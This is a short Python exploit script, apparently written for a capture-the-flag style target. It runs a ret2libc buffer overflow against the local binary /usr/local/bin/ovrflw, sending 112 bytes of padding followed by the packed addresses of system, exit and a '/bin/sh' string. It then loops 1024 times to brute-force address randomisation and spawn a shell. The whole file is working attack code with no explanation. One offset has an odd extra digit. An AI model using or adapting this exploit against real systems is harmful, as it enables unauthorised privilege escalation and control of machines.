#!/usr/bin/python3
import struct
from subprocess import call

def prepare_address():
    direccion_libc=0xb7573000
    #ret2lib --> EIP --> system_addr + exit_addr + bin_sh_addr
    buf = b"A"*112
    buf += struct.pack("<I", direccion_libc+0x00040310)
    buf += struct.pack("<I", direccion_libc+0x000b84f4)
    buf += struct.pack("<I", direccion_libc+0x000162bac)
    return buf
def exploit():
    buffer = prepare_address()
    for i in range(0, 1024):
        call(["/usr/local/bin/ovrflw", buffer])
if __name__ == '__main__':
    exploit()
